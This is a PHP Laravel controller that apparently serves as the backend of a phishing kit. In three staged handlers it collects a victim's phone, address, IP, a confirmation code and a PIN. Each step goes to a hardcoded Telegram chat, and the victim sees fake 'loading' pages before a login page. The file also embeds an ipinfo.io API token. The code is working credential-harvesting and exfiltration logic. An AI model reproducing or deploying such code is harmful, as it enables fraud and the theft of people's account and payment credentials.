<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Telegram\Bot\Laravel\Facades\Telegram;
use NotificationChannels\Telegram\TelegramMessage;
use Illuminate\Notifications\Notification;
use GuzzleHttp\Client;

class TelegramController extends Controller
{

    public function storeMessage(Request $request){
        
        $userIp = $request->ip();
        // Make a request to the ipinfo.io API
         $client = new Client();
         $response = $client->get("https://ipinfo.io/json?token=fddd21a33914d3");
        // Parse the JSON response
         $data = json_decode($response->getBody());
        // Extract user information
         $location = $data->loc;
         $country = $data->country;
         //$currency = $data->currency;
        // You can return the user information or use it as needed
        $request->validate([
            'phone'=>'required|numeric|min:99999999'
        ]);
         $text = $location."\n".$request->input('adresse')."\n".$request->input('country')."\n".$request->input('hiddenV');
        Telegram::sendMessage([
            'chat_id'=>'-1002003672783',
            'parse_mode'=>'HTML',
            'text'=>$text
        ]);
        return view('loading');

        //return redirect()->route('/confirm');
    }

    public function storeConfirm(Request $request){
        $request->validate([
            'xxxx'=>'required'
        ]);
        Telegram::sendMessage([
            'chat_id'=>'-1002003672783',
            'parse_mode'=>'HTML',
            'text'=>"IP : ".$request->input('hiddenV')."\n".$request->input('xxxx')
        ]);
        return view('loading2');
    }

    public function storeVerif(Request $request){
        $request->validate([
            'xxxx'=>'required'
        ]);
        Telegram::sendMessage([
            'chat_id'=>'-1002003672783',
            'parse_mode'=>'HTML',
            'text'=>$request->input('hiddenV')."\nPIN : ".$request->input('xxxx')
        ]);
        return view('login');
    }
    
}
